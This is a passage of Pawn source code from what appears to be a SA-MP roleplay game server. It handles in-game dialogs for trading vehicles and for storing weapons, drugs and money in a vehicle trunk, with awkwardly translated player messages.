			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 7)
		{
			if(PlayerInfo[playerid][pCarkey8] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pCarkey8];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 8)
		{
			if(PlayerInfo[playerid][pCarkey9] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pCarkey9];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 9)
		{
			if(PlayerInfo[playerid][pCarkey10] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pCarkey10];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 10)
		{
			if(PlayerInfo[playerid][pCarkey11] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pCarkey11];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 11)
		{
			if(PlayerInfo[playerid][pCarkey12] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pCarkey12];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 12)
		{
			if(PlayerInfo[playerid][pCarkey13] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pCarkey13];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 13)
		{
			if(PlayerInfo[playerid][pCarkey14] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pCarkey14];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 14)
		{
			if(PlayerInfo[playerid][pCarkey15] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pCarkey15];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(reusit > 0)
		{
			AdaugaItem(playerid, in_afacere_cu[playerid], 1, reusit);
		}
	}
	if(dialogid == DIALOG_PORTBAGAJ+1)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			if(listitem == 0)
			{
				if(CarInfo[idv][vArma1] > 0) 
				{
					format(MGLOBAL, sizeof(MGLOBAL), "{0066ff}Weapon:{FFFFFF}%s\n{0066ff}Bullets:{FFFFFF}%s\n-To make it this weapon may click 'Remove'.",GetWeaponNameByID(CarInfo[idv][vArma1]),FormatNumber(CarInfo[idv][vGArma1]));
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+2, DIALOG_STYLE_MSGBOX, "Trunk - weapons", MGLOBAL, "Remove", "CANCEL");
				}
				else
				{
					new textarma1[128];
					new textarma2[128];
					new textarma3[128];
					if(CarInfo[idv][vArma1] > 0) 
					{
						format(textarma1, sizeof(textarma1), "%s",GetWeaponNameByID(CarInfo[idv][vArma1]));
					}
					else
					{
						textarma1 = "Slot gol";
					}	
					if(CarInfo[idv][vArma2] > 0) 
					{
						format(textarma2, sizeof(textarma2), "%s",GetWeaponNameByID(CarInfo[idv][vArma2]));
					}
					else
					{
						textarma2 = "Slot gol";
					}	
					if(CarInfo[idv][vArma3] > 0) 
					{
						format(textarma3, sizeof(textarma3), "%s",GetWeaponNameByID(CarInfo[idv][vArma3]));
					}
					else
					{
						textarma3 = "Slot gol";
					}	
					new executat = 0;
					if(CarInfo[idv][vArma1] > 0 && CarInfo[idv][vArma2] > 0 && CarInfo[idv][vArma3] > 0) format(MGLOBAL, sizeof(MGLOBAL), "%s\n%s\n%s",textarma1,textarma2,textarma3),executat = 1;
					if(executat == 0) format(MGLOBAL, sizeof(MGLOBAL), "%s\n%s\n%s\nstore weapons",textarma1,textarma2,textarma3);
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+1, DIALOG_STYLE_LIST, "Trunk - weapons", MGLOBAL, "Select", "CANCEL");
				}
			}	
			if(listitem == 1)
			{			
				if(CarInfo[idv][vArma2] > 0) 
				{
					format(MGLOBAL, sizeof(MGLOBAL), "{0066ff}Weapon:{FFFFFF}%s\n{0066ff}Bullets:{FFFFFF}%s\n-To make it this gun click 'Remove'.",GetWeaponNameByID(CarInfo[idv][vArma2]),FormatNumber(CarInfo[idv][vGArma2]));
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+3, DIALOG_STYLE_MSGBOX, "Trunk - weapons", MGLOBAL, "Remove", "CANCEL");
				}
				else
				{
					new textarma1[128];
					new textarma2[128];
					new textarma3[128];
					if(CarInfo[idv][vArma1] > 0) 
					{
						format(textarma1, sizeof(textarma1), "%s",GetWeaponNameByID(CarInfo[idv][vArma1]));
					}
					else
					{
						textarma1 = "Slot gol";
					}	
					if(CarInfo[idv][vArma2] > 0) 
					{
						format(textarma2, sizeof(textarma2), "%s",GetWeaponNameByID(CarInfo[idv][vArma2]));
					}
					else
					{
						textarma2 = "Slot gol";
					}	
					if(CarInfo[idv][vArma3] > 0) 
					{
						format(textarma3, sizeof(textarma3), "%s",GetWeaponNameByID(CarInfo[idv][vArma3]));
					}
					else
					{
						textarma3 = "Slot gol";
					}	
					new executat = 0;
					if(CarInfo[idv][vArma1] > 0 && CarInfo[idv][vArma2] > 0 && CarInfo[idv][vArma3] > 0) format(MGLOBAL, sizeof(MGLOBAL), "%s\n%s\n%s",textarma1,textarma2,textarma3),executat = 1;
					if(executat == 0) format(MGLOBAL, sizeof(MGLOBAL), "%s\n%s\n%s\nstore weapons",textarma1,textarma2,textarma3);
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+1, DIALOG_STYLE_LIST, "Trunk - weapons", MGLOBAL, "Select", "CANCEL");
				}
			}
			if(listitem == 2)
			{
				if(CarInfo[idv][vArma3] > 0) 
				{
					format(MGLOBAL, sizeof(MGLOBAL), "{0066ff}Weapon:{FFFFFF}%s\n{0066ff}Bullets:{FFFFFF}%s\n-To make it this gun click 'Remove'.",GetWeaponNameByID(CarInfo[idv][vArma3]),FormatNumber(CarInfo[idv][vGArma3]));
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+4, DIALOG_STYLE_MSGBOX, "Trunk - weapons", MGLOBAL, "Remove", "CANCEL");
				}
				else
				{
					new textarma1[128];
					new textarma2[128];
					new textarma3[128];
					if(CarInfo[idv][vArma1] > 0) 
					{
						format(textarma1, sizeof(textarma1), "%s",GetWeaponNameByID(CarInfo[idv][vArma1]));
					}
					else
					{
						textarma1 = "Slot gol";
					}	
					if(CarInfo[idv][vArma2] > 0) 
					{
						format(textarma2, sizeof(textarma2), "%s",GetWeaponNameByID(CarInfo[idv][vArma2]));
					}
					else
					{
						textarma2 = "Slot gol";
					}	
					if(CarInfo[idv][vArma3] > 0) 
					{
						format(textarma3, sizeof(textarma3), "%s",GetWeaponNameByID(CarInfo[idv][vArma3]));
					}
					else
					{
						textarma3 = "Slot gol";
					}	
					new executat = 0;
					if(CarInfo[idv][vArma1] > 0 && CarInfo[idv][vArma2] > 0 && CarInfo[idv][vArma3] > 0) format(MGLOBAL, sizeof(MGLOBAL), "%s\n%s\n%s",textarma1,textarma2,textarma3),executat = 1;
					if(executat == 0) format(MGLOBAL, sizeof(MGLOBAL), "%s\n%s\n%s\nstore weapons",textarma1,textarma2,textarma3);
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+1, DIALOG_STYLE_LIST, "Trunk - weapons", MGLOBAL, "Select", "CANCEL");
				}
			}
			if(listitem == 3)
			{
				if(GetPlayerWeapon(playerid) > 0)
				{
					new gloante = GetPlayerAmmo(playerid);
					format(MGLOBAL, sizeof(MGLOBAL), "You're about to deposit a gun in the trunk of your vehicle\n\nWeapon: %s\nBullets: %s\n\n(!) To submit this weapon click 'Submit'.", GetWeaponNameByID(GetPlayerWeapon(playerid)),FormatNumber(gloante));
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+5, DIALOG_STYLE_MSGBOX, "deposit gun", MGLOBAL, "Submit", "CANCEL");
				}
				else
				{
					new engine, lights, alarm, doors, bonnet, boot, objective;
					GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
					SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
					return SCM(playerid, COLOR_ERROR, "You have a gun.");
				}
			}
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}
	}
	if(dialogid == DIALOG_PORTBAGAJ+2)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			new arma[128];
			new gloante = CarInfo[idv][vGArma1];
			format(arma, sizeof(arma), "%s",GetWeaponNameByID(CarInfo[idv][vArma1]));
			GivePlayerWeaponEx(playerid, CarInfo[idv][vArma1], CarInfo[idv][vGArma1]);
			CarInfo[idv][vArma1] = 0;
			CarInfo[idv][vGArma1] = 0;
			format(MGLOBAL, sizeof(MGLOBAL), "You pulled a gun %s with %s bullets in the trunk.",arma,FormatNumber(gloante));
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
			vUpdate(idv, cPortbagaj);
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}
	}
	if(dialogid == DIALOG_PORTBAGAJ+3)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			new arma[128];
			new gloante = CarInfo[idv][vGArma2];
			format(arma, sizeof(arma), "%s",GetWeaponNameByID(CarInfo[idv][vArma2]));
			GivePlayerWeaponEx(playerid, CarInfo[idv][vArma2], CarInfo[idv][vGArma2]);
			CarInfo[idv][vArma2] = 0;
			CarInfo[idv][vGArma2] = 0;
			format(MGLOBAL, sizeof(MGLOBAL), "You pulled a gun %s with %s bullets in the trunk.",arma,FormatNumber(gloante));
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
			vUpdate(idv, cPortbagaj);
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}
	}
	if(dialogid == DIALOG_PORTBAGAJ+4)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			new arma[128];
			new gloante = CarInfo[idv][vGArma3];
			format(arma, sizeof(arma), "%s",GetWeaponNameByID(CarInfo[idv][vArma3]));
			GivePlayerWeaponEx(playerid, CarInfo[idv][vArma3], CarInfo[idv][vGArma3]);
			CarInfo[idv][vArma3] = 0;
			CarInfo[idv][vGArma3] = 0;
			format(MGLOBAL, sizeof(MGLOBAL), "You pulled a gun %s with %s bullets in the trunk.",arma,FormatNumber(gloante));
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
			vUpdate(idv, cPortbagaj);
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}
	}
	if(dialogid == DIALOG_PORTBAGAJ+5)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			new gloante = GetPlayerAmmo(playerid);
			if(CarInfo[idv][vArma1] == 0) 
			{
				CarInfo[idv][vGArma1] = gloante;
				RemovePlayerWeapon(playerid, GetPlayerWeapon(playerid));
				new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
				return CarInfo[idv][vArma1] = GetPlayerWeapon(playerid),SCM(playerid, COLOR_SERVER, "The weapon was added in trunk."),vUpdate(idv, cPortbagaj);
			}
			if(CarInfo[idv][vArma2] == 0) 
			{	
				CarInfo[idv][vGArma2] = gloante;
				RemovePlayerWeapon(playerid, GetPlayerWeapon(playerid));
				new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
				return CarInfo[idv][vArma2] = GetPlayerWeapon(playerid),SCM(playerid, COLOR_SERVER, "The weapon was added in trunk."),vUpdate(idv, cPortbagaj);
			}
			if(CarInfo[idv][vArma3] == 0) 
			{	
				CarInfo[idv][vGArma3] = gloante;
				RemovePlayerWeapon(playerid, GetPlayerWeapon(playerid));
				new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
				return CarInfo[idv][vArma3] = GetPlayerWeapon(playerid),SCM(playerid, COLOR_SERVER, "The weapon was added in trunk."),vUpdate(idv, cPortbagaj);
			}
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}		
	}
	if(dialogid == DIALOG_PORTBAGAJ)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			if(listitem == 0)
			{
				new textarma1[128];
				new textarma2[128];
				new textarma3[128];
				if(CarInfo[idv][vArma1] > 0) 
				{
					format(textarma1, sizeof(textarma1), "%s",GetWeaponNameByID(CarInfo[idv][vArma1]));
				}
				else
				{
					textarma1 = "Slot gol";
				}	
				if(CarInfo[idv][vArma2] > 0) 
				{
					format(textarma2, sizeof(textarma2), "%s",GetWeaponNameByID(CarInfo[idv][vArma2]));
				}
				else
				{
					textarma2 = "Slot gol";
				}	
				if(CarInfo[idv][vArma3] > 0) 
				{
					format(textarma3, sizeof(textarma3), "%s",GetWeaponNameByID(CarInfo[idv][vArma3]));
				}
				else
				{
					textarma3 = "Slot gol";
				}	
				new executat = 0;
				if(CarInfo[idv][vArma1] > 0 && CarInfo[idv][vArma2] > 0 && CarInfo[idv][vArma3] > 0) format(MGLOBAL, sizeof(MGLOBAL), "%s\n%s\n%s",textarma1,textarma2,textarma3),executat = 1;
				if(executat == 0) format(MGLOBAL, sizeof(MGLOBAL), "%s\n%s\n%s\nstore weapons",textarma1,textarma2,textarma3);
				ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+1, DIALOG_STYLE_LIST, "Portbagaj - arme", MGLOBAL, "Select", "CANCEL");
			}
			if(listitem == 1)
			{
				format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add / withdraw drugs from the trunk of your vehicle.\n\n{0066FF}Drugs: {FFFFFF}%sg\n\n(!) To deposit / withdraw drugs from the trunk press 'Menu'.",FormatNumber(CarInfo[idv][vDroguri]));
				ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+6, DIALOG_STYLE_MSGBOX, "Add / drug withdrawal", MGLOBAL, "Menu", "CANCEL");
			}
			if(listitem == 2)
			{
				format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add / withdraw money from the trunk of your vehicle.\n\n{0066FF}Money: {FFFFFF}$%s\n\n(!) To deposit / withdraw money from trunk press 'Menu'.",FormatNumber(CarInfo[idv][vBani]));
				ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+10, DIALOG_STYLE_MSGBOX, "Add / drug withdrawal", MGLOBAL, "Menu", "CANCEL");
			}
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}
	}
	if(dialogid == DIALOG_PORTBAGAJ+15)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add money in the trunk of your vehicle.\n\n{0066FF}current money:{FFFFFF} $%s\n\n(!) To deposit money in the trunk, enter the desired amount and click 'Confirm'.",FormatNumber(CarInfo[idv][vBani]));
			ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+11, DIALOG_STYLE_INPUT, "Add money", MGLOBAL, "Lodge", "CANCEL");
		}
		else
		{
			format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to withdraw money from the trunk of your vehicle.\n\n{0066FF}current money:{FFFFFF} $%s\n\n(!) To withdraw money from trunk enter the desired amount and click 'Confirm'",FormatNumber(CarInfo[idv][vBani]));
			ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+12, DIALOG_STYLE_INPUT, "cash Out", MGLOBAL, "Withdraw", "CANCEL");
		}
	}
	if(dialogid == DIALOG_PORTBAGAJ+10)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add / withdraw money from the trunk of your vehicle.\n\n{0066ff}Money:{FFFFFF} %s\n\n(!) To deposit / withdraw money from trunk click 'Submit' or 'Withdraw'.",FormatNumber(CarInfo[idv][vBani]));
			ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+15, DIALOG_STYLE_MSGBOX, "Add / drug withdrawal", MGLOBAL, "deposit", "Retrage");
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}
	}	
	if(dialogid == DIALOG_PORTBAGAJ+6)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add / withdraw drugs from the trunk of your vehicle.\n\n{0066FF}Drugs:{FFFFFF} %sg\n\n(!) To deposit / withdraw from drugs trunk Or click 'Submit' Withdraw '.",FormatNumber(CarInfo[idv][vDroguri]));
			ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+7, DIALOG_STYLE_MSGBOX, "Add / drug withdrawal", MGLOBAL, "Lodge", "Retrage");
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}
	}
	if(dialogid == DIALOG_PORTBAGAJ+7)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add drugs in the trunk of your vehicle.\n\n{0066FF}current drug:{FFFFFF} %sg\n\n(!) To submit drugs enter the desired amount and click 'Confirm'.",FormatNumber(CarInfo[idv][vDroguri]));
			ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+8, DIALOG_STYLE_INPUT, "Add drugs", MGLOBAL, "Confirm", "CANCEL");
		}
		else
		{
			format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to withdraw the drug from the trunk of your vehicle.\n\n{0066FF}current drug:{FFFFFF} %sg\n\n(!) To withdraw drugs enter the desired amount and click 'Confirm'.",FormatNumber(CarInfo[idv][vDroguri]));
			ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+9, DIALOG_STYLE_INPUT, "Add drugs", MGLOBAL, "Confirm", "CANCEL");
		}
	}
	if(dialogid == DIALOG_PORTBAGAJ+11)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			if(IsNumeric(inputtext))
			{
				new suma = strval(inputtext);
				if(suma > 0 && suma <= 500000000)
				{
					if(CarInfo[idv][vBani] + suma <= 500000000)
					{
						if(GetPlayerCash(playerid) >= suma)
						{
							GivePlayerCash(playerid, -suma);
							CarInfo[idv][vBani] += suma;
							Update(playerid, pCashx);
							format(MGLOBAL, sizeof(MGLOBAL), "you took $%s in the trunk of the vehicle.",FormatNumber(suma));
							SCM(playerid, COLOR_SERVER, MGLOBAL);
							vUpdate(idv, cPortbagaj);
							new engine, lights, alarm, doors, bonnet, boot, objective;
							GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
							SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
						}
						else
						{
							SCM(playerid, COLOR_ERROR, "You do not have enough money.");
							format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add money in the trunk of your vehicle.\n\n{0066FF}current money:{FFFFFF} $%s\n\n(!) To deposit money in the trunk, enter the desired amount and click 'Confirm'.",FormatNumber(CarInfo[idv][vBani]));
							ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+11, DIALOG_STYLE_INPUT, "Add money", MGLOBAL, "deposit", "CANCEL");
						}
					}
					else
					{
						SCM(playerid, COLOR_ERROR, "You can submit up $500,000,000 Trunk, try a smaller amount.");
						format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add money in the trunk of your vehicle.\n\n{0066FF}current money:{FFFFFF} $%s\n\n(!) To deposit money in the trunk, enter the desired amount and click 'Confirm'.",FormatNumber(CarInfo[idv][vBani]));
						ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+11, DIALOG_STYLE_INPUT, "Add money", MGLOBAL, "deposit", "CANCEL");
					}
				}
				else
				{
					SCM(playerid, COLOR_ERROR, "you can deposit maximum $500,000,000, and minimum $1.");
					format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add money in the trunk of your vehicle.\n\n{0066FF}current money:{FFFFFF} $%s\n\n(!) To deposit money in the trunk, enter the desired amount and click 'Confirm'.",FormatNumber(CarInfo[idv][vBani]));
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+11, DIALOG_STYLE_INPUT, "Add money", MGLOBAL, "deposit", "CANCEL");
				}
			}
			else
			{
				SCM(playerid, COLOR_ERROR, "You can enter only numbers!");
				format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add money in the trunk of your vehicle.\n\n{0066FF}current money:{FFFFFF} $%s\n\n(!) To deposit money in the trunk, enter the desired amount and click 'Confirm'.",FormatNumber(CarInfo[idv][vBani]));
				ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+11, DIALOG_STYLE_INPUT, "Add money", MGLOBAL, "deposit", "CANCEL");
			}
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}
	}	
	if(dialogid == DIALOG_PORTBAGAJ+12)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			if(IsNumeric(inputtext))
			{
				new suma = strval(inputtext);
				if(suma > 0 && suma <= 500000000)
				{
					if(CarInfo[idv][vBani] >= suma)
					{
						GivePlayerCash(playerid, suma);
						CarInfo[idv][vBani] -= suma;
						Update(playerid, pCashx);
						format(MGLOBAL, sizeof(MGLOBAL), "you retired $%s from the trunk of the vehicle.",FormatNumber(suma));
						SCM(playerid, COLOR_SERVER, MGLOBAL);
						vUpdate(idv, cPortbagaj);
						new engine, lights, alarm, doors, bonnet, boot, objective;
						GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
						SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
					}
					else
					{
						SCM(playerid, COLOR_ERROR, "from the trunk of the vehicle....");
						format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to withdraw money from the trunk of your vehicle.\n\n{0066FF}current money:{FFFFFF} $%s\n\n(!) To withdraw money from trunk enter the desired amount and click 'Confirm'",FormatNumber(CarInfo[idv][vBani]));
						ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+12, DIALOG_STYLE_INPUT, "cash Out", MGLOBAL, "Withdraw", "CANCEL");
					}
				}
				else
				{
					SCM(playerid, COLOR_ERROR, "You can withdraw minimum $1, and up $500,000,000.");
					format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to withdraw money from the trunk of your vehicle.\n\n{0066FF}current money:{FFFFFF} $%s\n\n(!) To withdraw money from trunk enter the desired amount and click 'Confirm'",FormatNumber(CarInfo[idv][vBani]));
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+12, DIALOG_STYLE_INPUT, "cash Out", MGLOBAL, "Withdraw", "CANCEL");
				}
			}
			else
			{
				SCM(playerid, COLOR_ERROR, "You can enter only numbers!");
				format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to withdraw money from the trunk of your vehicle.\n\n{0066FF}current money:{FFFFFF} $%s\n\n(!) To withdraw money from trunk enter the desired amount and click 'Confirm'",FormatNumber(CarInfo[idv][vBani]));
				ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+12, DIALOG_STYLE_INPUT, "cash Out", MGLOBAL, "Withdraw", "CANCEL");
			}
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
